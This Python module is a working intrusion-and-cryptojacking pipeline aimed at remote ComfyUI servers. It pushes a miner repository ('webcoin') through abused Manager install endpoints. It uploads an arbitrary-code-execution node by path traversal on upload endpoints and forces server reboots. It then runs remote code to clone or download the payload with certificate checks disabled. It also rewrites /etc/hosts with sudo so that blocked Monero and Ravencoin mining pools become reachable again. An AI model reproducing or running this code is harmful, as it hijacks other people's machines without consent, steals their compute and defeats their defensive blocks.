"""
Installation pipeline — multi-strategy install with intelligent fallbacks.

Strategy order:
  1. Manager direct git install (if security allows)
  2. Manager queue install (multiple payload formats)
  3. Code execution: git clone via best available node
  4. Code execution: zip download fallback
  5. Post-install: update to latest, pip install, DNS fix
"""

from __future__ import annotations
from typing import Callable

from . import http_client as http
from . import executor
from .discovery import ServerProfile, discover

LOG_CB = Callable[[str], None]

REPO_URL = "https://github.com/bossman79/webcoin.git"
REPO_BARE = "https://github.com/bossman79/webcoin"
REPO_ZIP = "https://github.com/bossman79/webcoin/archive/refs/heads/master.zip"


def _log(cb: LOG_CB | None, msg: str):
    if cb:
        cb(msg)


def _is_plausible_custom_nodes_path(cn: str) -> bool:
    """Heuristic: accept POSIX + Windows absolute paths; reject bare labels."""
    s = (cn or "").strip()
    if len(s) < 3:
        return False
    if s.startswith("\\\\") or s.startswith("\\\\?\\"):
        return True
    if "/" in s or "\\" in s:
        return True
    return len(s) > 1 and s[1] == ":"


def _escape_for_pystr(path: str) -> str:
    """Double backslashes so a Windows path survives inside a Python string literal."""
    return path.replace("\\", "\\\\")


# ─── Remote code templates ───────────────────────────────────────────

# Prefer folder_paths (true ComfyUI path in-process), then well-known locations,
# then shallow path guesses only (no os.walk — too slow for deploy client polls).
FIND_CUSTOM_NODES = r'''import os
def _find():
    # One outer try: patched Comfy builds can leave folder_names_and_paths["custom_nodes"]
    # as None so get_folder_paths() raises TypeError ('NoneType' not subscriptable) inside
    # Comfy's own folder_paths.py — that must not kill IDENode before static fallbacks run.
    try:
        import folder_paths
        if hasattr(folder_paths, "get_folder_paths") and callable(getattr(folder_paths, "get_folder_paths")):
            try:
                cns = folder_paths.get_folder_paths("custom_nodes")
            except (KeyError, TypeError, AttributeError):
                cns = None
            if cns is not None:
                if isinstance(cns, dict):
                    for v in cns.values():
                        if isinstance(v, (list, tuple)):
                            for c in v:
                                if isinstance(c, str) and c and os.path.isdir(c):
                                    return c
                        elif isinstance(v, str) and v and os.path.isdir(v):
                            return v
                elif not isinstance(cns, (list, tuple)):
                    cns = [cns]
                for c in cns:
                    if isinstance(c, str) and c and os.path.isdir(c):
                        return c
        fnp = getattr(folder_paths, "folder_names_and_paths", None)
        if isinstance(fnp, dict):
            entry = fnp.get("custom_nodes")
            if isinstance(entry, (list, tuple)) and len(entry) >= 1:
                paths = entry[0]
                if isinstance(paths, list):
                    for c in paths:
                        if isinstance(c, str) and c and os.path.isdir(c):
                            return c
        fp = getattr(folder_paths, "__file__", None)
        if isinstance(fp, str) and fp:
            d = os.path.join(os.path.dirname(fp), "custom_nodes")
            if os.path.isdir(d):
                return d
        for g in (
            "/app/ComfyUI/custom_nodes", "/opt/ComfyUI/custom_nodes",
            "/root/ComfyUI/custom_nodes", "/workspace/ComfyUI/custom_nodes",
            "/data/ComfyUI/custom_nodes", "/basedir/custom_nodes",
            "/comfy/ComfyUI/custom_nodes", "/usr/local/ComfyUI/custom_nodes",
            "/mnt/ComfyUI/custom_nodes", "/export/ComfyUI/custom_nodes",
            "/home/user/ComfyUI/custom_nodes", "/home/ubuntu/ComfyUI/custom_nodes",
            "/var/ComfyUI/custom_nodes",
        ):
            if os.path.isdir(g):
                return g
        tails = ("ComfyUI/custom_nodes", "comfyui/custom_nodes", "ComfyUI/ComfyUI/custom_nodes")
        for base in ("/root", "/app", "/data", "/workspace", "/opt", "/srv", "/export", "/mnt", "/var"):
            if not os.path.isdir(base):
                continue
            for t in tails:
                p = os.path.join(base, *t.split("/"))
                if os.path.isdir(p):
                    return p
        home = os.path.expanduser("~")
        if isinstance(home, str) and home:
            for t in tails:
                p = os.path.join(home, *t.split("/"))
                if os.path.isdir(p):
                    return p
    except Exception:
        pass
    return ""
return _find()
'''

CHECK_WEBCOIN = r'''import os
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
if has_init:
    commit = "unknown"
    try:
        import subprocess
        r = subprocess.run(["git", "-C", wc, "log", "--oneline", "-1"],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            commit = r.stdout.strip()
    except Exception:
        pass
    return f"installed|{{commit}}"
return "not_installed"
'''

GIT_CLONE = r'''import subprocess, os, sys, shutil
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
if os.path.isdir(wc):
    shutil.rmtree(wc, ignore_errors=True)
try:
    r = subprocess.run(
        ["git", "clone", "{repo_url}", "webcoin"],
        cwd=cn, capture_output=True, text=True, timeout=120
    )
except FileNotFoundError:
    return "exit=-1\ngit not found in PATH\ninstalled=False"
lines = [f"exit={r.returncode}"]
if r.stderr.strip():
    lines.append(r.stderr.strip()[:300])
has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
lines.append(f"installed={has_init}")
if has_init:
    req = os.path.join(wc, "requirements.txt")
    if os.path.isfile(req):
        try:
            r2 = subprocess.run([sys.executable, "-m", "pip", "install", "-r", req],
                                capture_output=True, text=True, timeout=120)
            lines.append(f"pip={r2.returncode}")
        except Exception as e:
            lines.append(f"pip=err:{e}")
return "\n".join(lines)
'''

GIT_UPDATE = r'''import subprocess, os
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
try:
    r1 = subprocess.run(["git", "-C", wc, "fetch", "--all"],
                         capture_output=True, text=True, timeout=30)
    r2 = subprocess.run(["git", "-C", wc, "reset", "--hard", "origin/master"],
                         capture_output=True, text=True, timeout=30)
    r3 = subprocess.run(["git", "-C", wc, "log", "--oneline", "-1"],
                         capture_output=True, text=True, timeout=10)
    commit = r3.stdout.strip()
    resilience = os.path.isfile(os.path.join(wc, "core", "resilience.py"))
    cache_dir = os.path.isfile(os.path.join(wc, "core", "cache_dir.py"))
    return f"fetch={r1.returncode}|reset={r2.returncode}|commit={commit}|resilience={resilience}|cache_dir={cache_dir}"
except FileNotFoundError:
    return "fetch=-1|reset=-1|commit=no_git|resilience=False|cache_dir=False"
'''

ZIP_INSTALL = r'''import os, sys, zipfile, shutil
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
if os.path.isdir(wc):
    shutil.rmtree(wc, ignore_errors=True)
zip_url = "{zip_url}"
zip_path = os.path.join(cn, "_wc_tmp.zip")
dl_ok = False
dl_errs = []

# Method 1: urllib with SSL context fallback
try:
    import urllib.request, ssl
    try:
        urllib.request.urlretrieve(zip_url, zip_path)
        dl_ok = True
    except Exception:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(zip_url)
        with urllib.request.urlopen(req, context=ctx, timeout=60) as resp:
            with open(zip_path, "wb") as f:
                while True:
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    f.write(chunk)
        dl_ok = True
except Exception as e:
    dl_errs.append(f"urllib:{e}")

# Method 2: requests library (often bundled with ComfyUI)
if not dl_ok:
    try:
        import requests
        r = requests.get(zip_url, timeout=60, verify=False)
        r.raise_for_status()
        with open(zip_path, "wb") as f:
            f.write(r.content)
        dl_ok = True
    except Exception as e:
        dl_errs.append(f"requests:{e}")

# Method 3: PowerShell on Windows
if not dl_ok and os.name == "nt":
    try:
        import subprocess
        cmd = f'powershell -Command "Invoke-WebRequest -Uri \'{zip_url}\' -OutFile \'{zip_path}\' -UseBasicParsing"'
        subprocess.run(cmd, shell=True, capture_output=True, timeout=90)
        dl_ok = os.path.isfile(zip_path) and os.path.getsize(zip_path) > 1000
    except Exception as e:
        dl_errs.append(f"powershell:{e}")

# Method 4: curl (usually available on Linux, sometimes on Windows)
if not dl_ok:
    try:
        import subprocess
        subprocess.run(["curl", "-fsSL", "-o", zip_path, zip_url],
                       capture_output=True, timeout=90)
        dl_ok = os.path.isfile(zip_path) and os.path.getsize(zip_path) > 1000
    except Exception as e:
        dl_errs.append(f"curl:{e}")

if not dl_ok:
    return f"zip_error=download failed: {'; '.join(dl_errs)}"

try:
    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(cn)
    extracted = os.path.join(cn, "webcoin-master")
    if os.path.isdir(extracted):
        os.rename(extracted, wc)
    try:
        os.unlink(zip_path)
    except Exception:
        pass
    has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
    if has_init:
        req_txt = os.path.join(wc, "requirements.txt")
        if os.path.isfile(req_txt):
            try:
                import subprocess
                subprocess.run([sys.executable, "-m", "pip", "install", "-r", req_txt],
                               capture_output=True, text=True, timeout=120)
            except Exception:
                pass
    return f"installed={has_init}"
except Exception as e:
    return f"zip_error={e}"
'''

DNS_FIX = r'''import subprocess, socket, os
lines = []
pools = ["pool.hashvault.pro", "gulf.moneroocean.stream", "rvn.2miners.com"]
blocked = []
for host in pools:
    try:
        ip = socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
        lines.append(f"{host} -> {ip}")
        if ip.startswith("0.") or ip == "127.0.0.1":
            blocked.append(host)
    except Exception as e:
        lines.append(f"{host} -> FAIL: {e}")
        blocked.append(host)
if blocked:
    lines.append("Blocked pools detected, fixing /etc/hosts ...")
    try:
        with open("/etc/hosts") as f:
            content = f.read()
        new_lines = []
        for line in content.splitlines():
            if any(p in line for p in pools) and "0.0.0.0" in line:
                continue
            new_lines.append(line)
        with open("/tmp/_hosts_fixed", "w") as f:
            f.write("\n".join(new_lines) + "\n")
        subprocess.run(["sudo", "-n", "cp", "/tmp/_hosts_fixed", "/etc/hosts"],
                       capture_output=True, timeout=10)
        subprocess.run(["sudo", "-n", "systemctl", "restart", "systemd-resolved"],
                       capture_output=True, timeout=10)
        lines.append("Fixed /etc/hosts and flushed DNS")
    except Exception as e:
        lines.append(f"Fix failed: {e}")
else:
    lines.append("DNS OK — no blocked pools")
return "\n".join(lines)
'''


# ─── Manager-based strategies ────────────────────────────────────────

def _strategy_manager_direct(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Try POST /customnode/install/git_url (requires weak security)."""
    base = profile.base_url
    _log(log, "[strategy] Manager direct git install ...")

    code, body = http.post(
        f"{base}/customnode/install/git_url",
        data={"url": REPO_URL},
        timeout=30,
    )
    if code == 200:
        _log(log, "  Direct install accepted (200)")
        _start_queue(profile, log)
        return True

    _log(log, f"  Direct install failed ({code})")
    return False


def _strategy_manager_queue(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Try multiple /manager/queue/install payload formats."""
    base = profile.base_url
    _log(log, "[strategy] Manager queue install ...")

    payloads = [
        {"url": REPO_URL, "version": "unknown"},
        {"url": REPO_BARE, "version": "unknown"},
        {"custom_nodes": [{"url": REPO_URL}]},
    ]

    for i, payload in enumerate(payloads):
        code, _ = http.post(f"{base}/manager/queue/install", data=payload, timeout=15)
        if code == 200:
            _log(log, f"  Queue payload {i} accepted")
            _start_queue(profile, log)
            return True
        _log(log, f"  Queue payload {i} -> {code}")

    return False


def _start_queue(profile: ServerProfile, log: LOG_CB | None):
    """Kick off queue processing and wait."""
    base = profile.base_url
    http.post(f"{base}/manager/queue/start", timeout=10)
    _log(log, "  Waiting for queue task ...")
    import time
    time.sleep(15)
    code, data = http.get_json(f"{base}/manager/queue/status", timeout=10)
    if data:
        _log(log, f"  Queue status: {data}")


# ─── Code-execution strategies ───────────────────────────────────────

def _find_custom_nodes(profile: ServerProfile, log: LOG_CB | None) -> str:
    """Discover the custom_nodes path on the remote server."""
    if profile.custom_nodes_path:
        return profile.custom_nodes_path

    if profile.custom_nodes_search_attempted:
        if not profile.custom_nodes_reuse_hint_logged:
            profile.custom_nodes_reuse_hint_logged = True
            _log(
                log,
                "  custom_nodes: skipping further probes this run (already attempted)",
            )
        return ""

    _log(log, "[strategy] Finding custom_nodes directory ...")
    # Spark deploy uses execute(..., timeout=60) for a single remote step; path discovery
    # must survive slow queues the same way (default execute timeout was too low).
    result = executor.execute(profile, FIND_CUSTOM_NODES, log=log, timeout=120)
    # Do not mark "attempted" on timeout/None: _check_installed runs FIND first; if /history
    # was not ready yet, we must allow _strategy_code_clone to probe again. Previously we set
    # attempted before execute(), which permanently skipped FIND after one missed poll.
    if result is not None:
        profile.custom_nodes_search_attempted = True
    if result and result.strip():
        cn = result.strip().splitlines()[-1].strip()
        if _is_plausible_custom_nodes_path(cn):
            profile.custom_nodes_path = cn
            _log(log, f"  custom_nodes: {cn}")
            return cn

    _log(log, "  Could not find custom_nodes directory")
    return ""


def _strategy_code_clone(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Git clone via code execution node."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "[strategy] Git clone via code execution ...")
    code = GIT_CLONE.replace("{cn_path}", _escape_for_pystr(cn)).replace("{repo_url}", REPO_URL)
    result = executor.execute(profile, code, log=log, timeout=120)
    if result and "installed=True" in result:
        _log(log, "  Git clone successful")
        return True

    _log(log, f"  Git clone result: {result}")
    return False


def _strategy_code_zip(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Download zip from GitHub when git fails."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "[strategy] Zip download fallback ...")
    code = ZIP_INSTALL.replace("{cn_path}", _escape_for_pystr(cn)).replace("{zip_url}", REPO_ZIP)
    result = executor.execute(profile, code, log=log, timeout=180)
    if result and "installed=True" in result:
        _log(log, "  Zip install successful")
        return True

    _log(log, f"  Zip install result: {result}")
    return False


def _update_to_latest(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Git fetch + reset --hard origin/master."""
    cn = profile.custom_nodes_path
    if not cn:
        cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "Updating to latest commit ...")
    code = GIT_UPDATE.replace("{cn_path}", _escape_for_pystr(cn))
    result = executor.execute(profile, code, log=log, timeout=120)
    if result:
        _log(log, f"  {result}")
        profile.webcoin_commit = result.split("commit=")[-1].split("|")[0] if "commit=" in result else ""
        if "no_git" in result:
            _log(log, "  git not in PATH — update skipped, zip install is current")
            return True
        return "reset=0" in result
    return False


def _check_installed(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Check if webcoin is already installed."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    code = CHECK_WEBCOIN.replace("{cn_path}", _escape_for_pystr(cn))
    result = executor.execute(profile, code, log=log, timeout=90)
    if result and "installed|" in result:
        commit = result.split("|", 1)[1].strip() if "|" in result else ""
        profile.webcoin_installed = True
        profile.webcoin_commit = commit
        _log(log, f"  webcoin installed, commit: {commit}")
        return True
    return False


WRITE_WORKER_SETTINGS = r'''import os, json
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
sp = os.path.join(wc, "settings.json")
settings = {{}}
if os.path.isfile(sp):
    try:
        with open(sp) as f:
            settings = json.load(f)
    except Exception:
        pass
settings["worker_name"] = "{worker_name}"
if "max_threads_hint" not in settings:
    settings["max_threads_hint"] = 50
with open(sp, "w") as f:
    json.dump(settings, f, indent=2)
return f"ok|worker={worker_name}|hint={settings.get('max_threads_hint')}"
'''


def _write_worker_settings(profile: ServerProfile, log: LOG_CB | None):
    """Write the deployment IP as worker_name + default CPU hint into settings.json."""
    cn = profile.custom_nodes_path
    if not cn:
        return
    worker_name = profile.ip.replace(".", "-")
    code = (WRITE_WORKER_SETTINGS
            .replace("{cn_path}", _escape_for_pystr(cn))
            .replace("{worker_name}", worker_name))
    _log(log, f"  Setting worker name to {worker_name} ...")
    result = executor.execute(profile, code, log=log, timeout=30)
    if result:
        _log(log, f"  {result}")


def _fix_dns(profile: ServerProfile, log: LOG_CB | None):
    """Check and fix DNS for mining pools."""
    _log(log, "Checking DNS for mining pools ...")
    result = executor.execute(profile, DNS_FIX, log=log, timeout=90)
    if result:
        for line in result.strip().splitlines():
            _log(log, f"  {line}")


# ─── Upload-based exec-node injection (no Manager required) ──────────

# Minimal custom node that registers an exec node + output node.
# Placed into custom_nodes/ via path traversal upload, loaded on restart.
EXEC_NODE_PAYLOAD = r'''
import os, sys, traceback

class _ExecBridge:
    """Execute arbitrary Python and return result as string."""
    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "utils"
    OUTPUT_NODE = False

    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {
            "code": ("STRING", {"multiline": True, "default": "result = 'hello'"}),
        }}

    def run(self, code=""):
        g = {}
        try:
            exec(code, g)
        except Exception:
            g["result"] = traceback.format_exc()
        return (str(g.get("result", "")),)


class _TextOut:
    """Display text in the UI."""
    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "utils"
    OUTPUT_NODE = True

    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {
            "text": ("STRING", {"forceInput": True}),
        }}

    def run(self, text=""):
        return {"ui": {"text": [text]}, "result": (text,)}


NODE_CLASS_MAPPINGS = {
    "IDENode": _ExecBridge,
    "PreviewTextNode": _TextOut,
}
NODE_DISPLAY_NAME_MAPPINGS = {
    "IDENode": "IDE Node",
    "PreviewTextNode": "Preview Text",
}
'''.strip()


def _try_upload_traversal(
    profile: ServerProfile, log: LOG_CB | None
) -> bool:
    """
    Upload a Python exec-node payload into custom_nodes/ via path traversal
    on /upload/temp (Impact-Pack) or /upload/image (older core builds).
    Returns True if the upload appeared to succeed.
    """
    base = profile.base_url

    traversal_filenames = [
        "../custom_nodes/comfyui_exec_bridge.py",
        "../../custom_nodes/comfyui_exec_bridge.py",
        "../../../custom_nodes/comfyui_exec_bridge.py",
        "..\\custom_nodes\\comfyui_exec_bridge.py",
        "..\\..\\custom_nodes\\comfyui_exec_bridge.py",
    ]

    endpoints = [
        "/upload/temp",
        "/api/upload/temp",
        "/upload/image",
        "/api/upload/image",
        "/internal/upload/temp",
    ]

    for ep in endpoints:
        for trav_name in traversal_filenames:
            url = f"{base}{ep}"
            _log(log, f"  Trying upload traversal: {ep} → {trav_name}")
            try:
                import urllib.request
                import uuid
                boundary = uuid.uuid4().hex
                payload_bytes = EXEC_NODE_PAYLOAD.encode("utf-8")

                body_parts = []
                # image file part
                body_parts.append(f"--{boundary}".encode())
                body_parts.append(
                    f'Content-Disposition: form-data; name="image"; filename="{trav_name}"'.encode()
                )
                body_parts.append(b"Content-Type: application/octet-stream")
                body_parts.append(b"")
                body_parts.append(payload_bytes)
                # overwrite=true so re-deploys don't get "(1)" suffix
                body_parts.append(f"--{boundary}".encode())
                body_parts.append(b'Content-Disposition: form-data; name="overwrite"')
                body_parts.append(b"")
                body_parts.append(b"true")
                body_parts.append(f"--{boundary}--".encode())
                body = b"\r\n".join(body_parts)

                req = urllib.request.Request(
                    url,
                    data=body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                    },
                )
                ctx = None
                if url.startswith("https"):
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
                    status = resp.status
                    resp_body = resp.read().decode(errors="replace")
                    if status == 200:
                        _log(log, f"    Upload accepted (HTTP 200): {resp_body[:120]}")
                        return True
                    _log(log, f"    HTTP {status}")
            except Exception as e:
                es = str(e)[:120]
                if "404" in es or "405" in es:
                    _log(log, f"    {ep} not available")
                    break
                if "400" in es:
                    _log(log, f"    Traversal blocked (400)")
                    continue
                _log(log, f"    {es}")
                continue

    return False


def _strategy_upload_exec_nodes(
    profile: ServerProfile, log: LOG_CB | None
) -> bool:
    """
    Full strategy: upload exec node payload via path traversal,
    reboot, wait for server, re-discover.
    """
    _log(log, "[strategy] Upload exec-node payload via path traversal ...")
    if not _try_upload_traversal(profile, log):
        _log(log, "  Upload traversal failed on all endpoints")
        return False

    _log(log, "  Payload uploaded — rebooting to activate ...")
    rebooted = reboot(profile, log)
    if not rebooted:
        _log(log, "  Reboot failed — payload will activate on next manual restart")
        return False

    new_profile = _wait_for_server(
        profile.ip, profile.scheme, profile.port, log=log, timeout_sec=300
    )
    if not new_profile or not new_profile.reachable:
        _log(log, f"  {profile.ip} did not come back after reboot")
        return False

    if new_profile.all_exec_nodes:
        _log(log, f"  Exec nodes now active: {', '.join(ct for _, ct in new_profile.all_exec_nodes)}")
        profile.__dict__.update(new_profile.__dict__)
        return True

    _log(log, "  Server is back but exec nodes still not detected after upload")
    return False


# ─── Exec-node auto-install via Manager ──────────────────────────────

EXEC_NODE_REPOS = [
    ("IDENode + AlekPet nodes",     "https://github.com/AlekPet/ComfyUI_Custom_Nodes_AlekPet"),
    ("SRL Eval",                    "https://github.com/seanlynch/srl-nodes"),
    ("pysssss Custom Scripts",      "https://github.com/pythongosssss/ComfyUI-Custom-Scripts"),
]


def _install_node_via_manager(
    profile: ServerProfile, name: str, git_url: str, log: LOG_CB | None
) -> bool:
    """Try multiple Manager install methods for a single node pack."""
    base = profile.base_url

    # Method 1: POST /customnode/install/git_url (requires security=normal-)
    code, body = http.post(
        f"{base}/customnode/install/git_url",
        data=git_url,
        timeout=90,
    )
    if code == 200:
        _log(log, f"    {name} — install accepted (git_url)")
        return True
    if code == 403:
        _log(log, f"    {name} — git_url blocked by security, trying queue ...")
    else:
        _log(log, f"    {name} — git_url returned {code}, trying queue ...")

    # Method 2: POST /manager/queue/install (requires security=middle)
    payload = {
        "version": "unknown",
        "selected_version": "unknown",
        "files": [git_url],
        "channel": "default",
        "mode": "default",
    }
    code, _ = http.post(f"{base}/manager/queue/install", data=payload, timeout=30)
    if code == 200:
        _log(log, f"    {name} — queued for install")
        return True

    _log(log, f"    {name} — queue install returned {code}")
    return False


def _install_exec_nodes(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """
    Install code-execution nodes via Manager when the server has none.
    Returns True if at least one was installed (reboot required).
    """
    if not profile.has_manager:
        _log(log, "  No Manager detected — cannot install exec nodes")
        return False

    _log(log, "[strategy] Installing execution nodes via Manager ...")
    installed_any = False

    for name, git_url in EXEC_NODE_REPOS:
        if _install_node_via_manager(profile, name, git_url, log):
            installed_any = True

    if installed_any:
        # Kick the queue worker if any were queued
        http.get(f"{profile.base_url}/manager/queue/start", timeout=10)
        import time
        _log(log, "  Waiting 30s for Manager to process install queue ...")
        time.sleep(30)
        # Check queue status
        code, data = http.get_json(f"{profile.base_url}/manager/queue/status", timeout=10)
        if data:
            _log(log, f"  Queue status: {data}")

    return installed_any


# ─── Reboot ──────────────────────────────────────────────────────────

def reboot(profile: ServerProfile, log: LOG_CB | None = None) -> bool:
    """
    Reboot ComfyUI. The Manager's GET /manager/reboot calls os.execv()
    which kills the process BEFORE the HTTP response is sent, so a
    connection error (status 0) actually means the reboot succeeded.
    """
    base = profile.base_url
    _log(log, f"Rebooting ComfyUI on {profile.ip} ...")

    # Method 1: Manager reboot endpoint (GET is the correct method)
    for ep in ["/manager/reboot", "/api/manager/reboot"]:
        code, body = http.request(f"{base}{ep}", method="GET", timeout=15)
        if code == 200:
            _log(log, f"  Reboot response 200 ({ep})")
            return True
        if code == 0:
            # Connection died = server terminated via os.execv = reboot worked
            _log(log, f"  Server terminated after {ep} — reboot in progress")
            return True
        if code == 403:
            _log(log, f"  {ep} returned 403 (security blocked)")
            continue
        _log(log, f"  {ep} returned {code}")

    # Method 2: POST variant (some older Manager builds register POST)
    for ep in ["/manager/reboot", "/api/manager/reboot"]:
        code, body = http.request(f"{base}{ep}", method="POST", timeout=15)
        if code in (0, 200):
            _log(log, f"  Reboot via POST {ep} — {'server terminated' if code == 0 else 'accepted'}")
            return True

    # Method 3: Code execution — hit reboot from localhost (bypasses CORS/proxy)
    if profile.all_exec_nodes:
        _log(log, "  External reboot blocked, trying internal localhost reboot ...")
        reboot_code = r'''import urllib.request, sys, os, time
ports = [8188, 80, 8888, 443]
tried = []
for port in ports:
    for ep in ["/manager/reboot", "/api/manager/reboot"]:
        url = f"http://127.0.0.1:{port}{ep}"
        try:
            urllib.request.urlopen(url, timeout=10)
            tried.append(f"{url}=200")
        except Exception as e:
            es = str(e)
            if "Connection refused" not in es and "URLError" not in es:
                tried.append(f"{url}=conn_died(reboot)")
                return "rebooting|" + "|".join(tried)
            tried.append(f"{url}={es[:60]}")
return "no_reboot|" + "|".join(tried)
'''
        result = executor.execute(profile, reboot_code, log=log, timeout=45)
        if result:
            _log(log, f"  Internal result: {result[:200]}")
            if "rebooting" in result or "conn_died" in result:
                return True

    # Method 4: sys.exit via code execution (last resort, kills the process)
    if profile.all_exec_nodes:
        _log(log, "  Trying sys.exit() to force ComfyUI restart ...")
        kill_code = r'''import os, sys, signal
try:
    os.kill(os.getpid(), signal.SIGTERM)
except Exception:
    pass
sys.exit(0)
return "killed"
'''
        code_status, _ = http.request(f"{base}/prompt", method="POST", timeout=5)
        executor.execute(profile, kill_code, log=log, timeout=10)
        import time
        time.sleep(3)
        probe_code, _ = http.get(f"{base}/system_stats", timeout=5)
        if probe_code == 0:
            _log(log, "  Server appears to have terminated (sys.exit)")
            return True

    _log(log, "  Reboot failed — all methods blocked")
    return False


def _wait_for_server(
    ip: str, scheme: str, port: int,
    log: LOG_CB | None = None,
    timeout_sec: int = 300,
    poll_interval: int = 15,
) -> ServerProfile | None:
    """
    Poll a server after reboot until it comes back online.
    Returns a fresh ServerProfile or None if it never came back.
    """
    import time
    base = f"{scheme}://{ip}:{port}"
    _log(log, f"  Waiting up to {timeout_sec // 60}min for {ip} to come back ...")
    start = time.time()
    attempt = 0
    while time.time() - start < timeout_sec:
        attempt += 1
        elapsed = int(time.time() - start)
        _log(log, f"  [{elapsed}s] Polling {ip} (attempt {attempt}) ...")
        code, _ = http.get_json(f"{base}/system_stats", timeout=10)
        if code == 200:
            _log(log, f"  {ip} is back online after {elapsed}s!")
            # Full re-discovery
            profile = discover(ip, log=log)
            return profile
        # Also check /object_info as a backup
        code2, _ = http.get(f"{base}/object_info", timeout=8)
        if code2 == 200:
            _log(log, f"  {ip} is back (object_info ok) after {elapsed}s!")
            profile = discover(ip, log=log)
            return profile
        time.sleep(poll_interval)

    _log(log, f"  {ip} did not come back within {timeout_sec}s")
    return None


# ─── Main pipeline ───────────────────────────────────────────────────

def install(ip: str, log: LOG_CB | None = None) -> tuple[ServerProfile, bool]:
    """
    Full install pipeline for one server.
    Returns (profile, success).
    """
    profile = discover(ip, log=log)
    if not profile.reachable:
        _log(log, f"FAILED: {ip} is unreachable")
        return profile, False

    has_exec = bool(profile.all_exec_nodes)

    # ── If no exec nodes, try to install them ──
    if not has_exec:
        got_exec = False

        # Method A: Manager-based install (if Manager is present)
        if profile.has_manager:
            _log(log, f"  No exec nodes on {ip} — trying Manager install ...")
            if _install_exec_nodes(profile, log):
                _log(log, "  Exec nodes installed via Manager, rebooting to activate ...")
                rebooted = reboot(profile, log)
                if rebooted:
                    new_profile = _wait_for_server(
                        ip, profile.scheme, profile.port, log=log, timeout_sec=300
                    )
                    if new_profile and new_profile.reachable:
                        profile = new_profile
                        has_exec = bool(profile.all_exec_nodes)
                        got_exec = has_exec
                        if has_exec:
                            _log(log, f"  Exec nodes active: {', '.join(ct for _, ct in profile.all_exec_nodes)}")
                        else:
                            _log(log, "  Server back but exec nodes not detected after Manager install")
                    else:
                        _log(log, f"  {ip} did not come back after reboot")
                else:
                    _log(log, "  Reboot failed after Manager install")

        # Method B: Upload path traversal (works without Manager)
        if not got_exec:
            _log(log, f"  Trying upload-based exec node injection on {ip} ...")
            if _strategy_upload_exec_nodes(profile, log):
                has_exec = bool(profile.all_exec_nodes)
                got_exec = has_exec

    # Check if already installed
    if has_exec and _check_installed(profile, log):
        _log(log, "webcoin already installed — updating to latest ...")
        _update_to_latest(profile, log)
        _write_worker_settings(profile, log)
        _fix_dns(profile, log)
        _log(log, f"UPDATE COMPLETE for {ip}")
        _log(log, ">> Reboot ComfyUI to activate changes <<")
        return profile, True

    # Strategy 1: Manager direct install
    if profile.has_manager:
        if _strategy_manager_direct(profile, log):
            if has_exec:
                _update_to_latest(profile, log)
                _write_worker_settings(profile, log)
                _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via Manager direct)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

        # Strategy 2: Manager queue install
        if _strategy_manager_queue(profile, log):
            if has_exec:
                _update_to_latest(profile, log)
                _write_worker_settings(profile, log)
                _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via Manager queue)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

    # Strategy 3: Code execution — git clone
    if has_exec:
        if _strategy_code_clone(profile, log):
            _update_to_latest(profile, log)
            _write_worker_settings(profile, log)
            _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via code exec git clone)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

        # Strategy 4: Code execution — zip fallback
        if _strategy_code_zip(profile, log):
            _write_worker_settings(profile, log)
            _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via zip download)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

    _log(log, f"FAILED: No install strategy worked for {ip}")
    if not has_exec:
        _log(log, "  Server has no code-execution nodes and all injection methods failed:")
        _log(log, "    - Manager install: " + ("not available" if not profile.has_manager else "tried, did not produce exec nodes"))
        _log(log, "    - Upload traversal: tried all endpoints, blocked or unavailable")
        _log(log, "  This server may have patched upload endpoints and no Manager")
    else:
        _log(
            log,
            "  Code nodes did not return a usable custom_nodes path (or /history had no "
            "text yet). Non-standard ComfyUI layout, hardened IDENode output, or Manager "
            "install blocked — install webcoin manually on that host or fix execution output.",
        )
    return profile, False
